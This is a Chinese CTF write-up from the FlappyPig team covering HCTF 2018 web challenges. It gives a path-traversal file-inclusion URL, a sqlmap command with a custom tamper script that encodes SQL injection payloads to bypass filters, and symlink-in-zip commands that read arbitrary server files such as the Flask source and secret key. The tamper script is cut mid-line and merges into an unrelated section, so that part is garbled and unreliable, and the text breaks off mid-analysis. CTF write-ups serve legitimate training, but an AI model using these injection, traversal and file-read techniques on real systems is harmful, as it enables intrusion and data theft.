## 前言
一个招新小广告：FlappyPig 长期招新，尤其是 reverse+pwn
大佬。只要你感兴趣，只要你有耐心，只要你好学！！！请联系PI:EMAIL 。
[TOC]
## HCTF 2018 Online WriteUp
## Web
### Warmup
打开题目，f12发现
以及hint和link：`http://warmup.2018.hctf.io/index.php?file=hint.php`：
    flag not here, and flag in ffffllllaaaagggg
看到source.php，发现源代码
    "source.php","hint"=>"hint.php"];
                if (! isset($page) || !is_string($page)) {
                    echo "you can't see it";
                    return false;
                }
                if (in_array($page, $whitelist)) {
                    return true;
                }
                $_page = mb_substr(
                    $page,
                    0,
                    mb_strpos($page . '?', '?')
                );
                if (in_array($_page, $whitelist)) {
                    return true;
                }
                $_page = urldecode($page);
                $_page = mb_substr(
                    $_page,
                    0,
                    mb_strpos($_page . '?', '?')
                );
                if (in_array($_page, $whitelist)) {
                    return true;
                }
                echo "you can't see it";
                return false;
            }
        }
        if (! empty($_REQUEST['file'])
            && is_string($_REQUEST['file'])
            && emmm::checkFile($_REQUEST['file'])
        ) {
            include $_REQUEST['file'];
            exit;
        } else {
            echo "";
        }  
    ?>
发现只有
    $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
才能通过，但发现截取有问题
    $_page = mb_substr(
                    $_page,
                    0,
                    mb_strpos($_page . '?', '?')
                );
随即构造
    http://warmup.2018.hctf.io/?file=hint.php?/../../../../../../../../ffffllllaaaagggg
即可拿到flag
### Kzone
我们发现在用cookie做身份校验的时候查询了数据库
    if ($_COOKIE["login_data"]) {
            $login_data = json_decode($_COOKIE['login_data'], true);
            $admin_user = $login_data['admin_user'];
            $udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
发现其中用了`json_decode`，那么我们可以尝试使用编码进行bypass，即可无视一切过滤进行注入  
脚本如下  
a.txt:
    POST /admin/list.php HTTP/1.1
    Host: kzone.2018.hctf.io
    Content-Length: 33
    Cache-Control: max-age=0
    Origin: http://kzone.2018.hctf.io
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    Referer: http://kzone.2018.hctf.io/admin/login.php
    Accept-Encoding: gzip, deflate
    X-Forwarded-For: 127.0.1.3,1,2,3,4
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
    Cookie: PHPSESSID=7notm2n004aen7oln00ohd9ei3; islogin=1; login_data=*
    Connection: close
    user=rr123&pass=rr123&login=Login
Command:
    python sqlmap.py -r a.txt --tamper=hctf --dbs --dbms=mysql --thread=10 -D hctf_kouzone -T F1444g -C F1a9 --dump -v3
tamper/hctf.py
    #!/usr/bin/env python
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.LOW
    def dependencies():
        pass
    def tamper(payload, **kwargs):
        data = '''{"admin_user":"%s"};'''
        payload = payload.lower()
        payload = payload.replace('u', '\u0075')
        payload = payload.replace('o', '\u006f')
        payload = payload.replace('i', '\u0069')
        payload = payload.replace('\'', '\u0027')
        payload = payload.replace('\"', '\u0022')
        payload = payload.replace(' ', '\u0020')
        payload = payload.replace('s', '\u0073')
        payload = payload.replace('#', '\u0023')
        payload = payload.replace('>', '\u003e')
        payload = payload.replace(' A -> a
我们容易想到一个攻击链：
  * 注册用户ᴀdmin
  * 登录用户ᴀdmin，变成Admin
  * 修改密码Admin，更改了admin的密码
于是成功得到flag
### hide and seek
思路很清晰，伪造admin即可  
然后发现软连接可用来任意文件读取，那么想到读取secret_key  
读文件，文件名来源于日志
    ln -s /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 1.txt
    zip -y 1.zip 1.txt
得到内容
    # -*- coding: utf-8 -*-    from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
    import uuid
    import base64
    import random
    import flag
    from werkzeug.utils import secure_filename
    import os
    random.seed(uuid.getnode())
    app = Flask(__name__)
    app.config['SECRET_KEY'] = str(random.random()*100)
    app.config['UPLOAD_FOLDER'] = './uploads'
    app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
    ALLOWED_EXTENSIONS = set(['zip'])
    def allowed_file(filename):
        return '.' in filename and \
               filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
    @app.route('/', methods=['GET'])
    def index():
        error = request.args.get('error', '')
        if(error == '1'):
            session.pop('username', None)
            return render_template('index.html', forbidden=1)
        if 'username' in session:
            return render_template('index.html', user=session['username'], flag=flag.flag)
        else:
            return render_template('index.html')
    @app.route('/login', methods=['POST'])
    def login():
        username=request.form['username']
        password=request.form['password']
        if request.method == 'POST' and username != '' and password != '':
            if(username == 'admin'):
                return redirect(url_for('index',error=1))
            session['username'] = username
        return redirect(url_for('index'))
    @app.route('/logout', methods=['GET'])
    def logout():
        session.pop('username', None)
        return redirect(url_for('index'))
    @app.route('/upload', methods=['POST'])
    def upload_file():
        if 'the_file' not in request.files:
            return redirect(url_for('index'))
        file = request.files['the_file']
        if file.filename == '':
            return redirect(url_for('index'))
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            if(os.path.exists(file_save_path)):
                return 'This file already exists'
            file.save(file_save_path)
        else:
            return 'This file is not a zipfile'
        try:
            extract_path = file_save_path + '_'
            os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
            read_obj = os.popen('cat ' + extract_path + '/*')
            file = read_obj.read()
            read_obj.close()
            os.system('rm -rf ' + extract_path)
        except Exception as e:
            file = None
        os.remove(file_save_path)
        if(file != None):
            if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
                return redirect(url_for('index', error=1))
        return Response(file)
    if __name__ == '__main__':
        #app.run(debug=True)
        app.run(host='127.0.0.1', debug=True, port=10008)
关键语句
    random.seed(uuid.getnode())
    app = Flask(__name__)
    app.config['SECRET_KEY'] = str(random.random()*100)
但是SECRET_KEY是随机数，需要预测，那么需要py版本号  
在
    ln -s /app/main.py 1.txt
    zip -y 1.zip 1.txt
发现内容
    from flask import Flask
    app = Flask(__name__)